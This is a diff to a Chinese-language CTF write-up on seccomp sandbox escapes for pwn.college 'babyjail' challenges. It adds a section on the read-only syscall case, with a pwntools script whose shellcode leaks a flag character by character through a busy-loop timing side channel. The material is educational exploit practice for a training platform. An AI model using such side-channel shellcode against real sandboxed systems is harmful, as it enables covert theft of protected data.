@@ -18,6 +18,7 @@ comments: true
     - [2.1.4 只允许("chdir", "chroot", "mkdir", "open", "read", "write", "sendfile")](#214-只允许chdir-chroot-mkdir-open-read-write-sendfile)
     - [2.1.5 只允许("read", "exit")](#215-只允许read-exit)
     - [2.1.6 只允许("read", "nanosleep")](#216-只允许read-nanosleep)
+    - [2.1.7 只允许("read")](#217-只允许read)
   - [2.2 利用syscall confusion实现逃逸](#22-利用syscall-confusion实现逃逸)
     - [2.2.1 只限制x64，不限制x86](#221-只限制x64不限制x86)
 - [附录：利用chroot之前打开的目录/文件描述符 —— 手法](#附录利用chroot之前打开的目录文件描述符--手法)
@@ -359,6 +360,72 @@ for i in range(12,55):
             print("index:"+chr(i))
             print(flag)
             pause()
+            break
+        else :
+            print("not hit")
+            print(end_time-start_time)
+flag += "}"
+print(flag)
+```
+
+### 2.1.7 只允许("read")<br>
+核心还是和2.1.6节提到的一样，使用侧信道的方式获取flag<br>
+虽然我们不能调用sleep相关的syscall，但是可以手动建造循环来增加运行时间<br>
+```python
+from pwn import *
+import time
+
+#context.log_level = 'debug'
+flag = "pwn.college{"
+for i in range(12,55):
+    for j in range(32,128):
+        p = process(["/challenge/babyjail_level12","/flag"])
+        #print(p.recv())
+        shellcode = """
+            mov rdi, 3
+            lea rsi, [rip+buffer]
+            mov rdx, 0x100
+            mov rax, 0
+            syscall
+
+            xor rdi, rdi
+            xor rsi, rsi
+            mov sil, [rip+buffer+{}]
+            mov dil, {}
+            cmp sil, dil
+            jne end
+
+            mov rcx, 1000000000
+            mov rax, 0
+            loop:
+            add rax, 1
+            cmp rax, rcx
+            jle loop
+
+            end:
+            ret
+            buffer:
+            .space 0x100
+        """
+        shellcode = shellcode.format(i,j)
+        #print(shellcode)
+        shellcode = asm(shellcode,arch="amd64")
+        #print(shellcode)
+        #with open("shellcode.test","wb") as f:
+        #    f.write(shellcode)
+        p.sendline(shellcode)
+        start_time = time.time()
+        p.wait()
+        end_time = time.time()
+        #print(p.recv())
+        p.close()
+        if end_time-start_time >= 0.07:
+            #print("hit character:"+ chr(j))
+            flag += chr(j)
+            print("index:"+chr(i))
+            print(flag)
+            print(end_time-start_time)
+            #pause()
             break
         else :
             print("not hit")
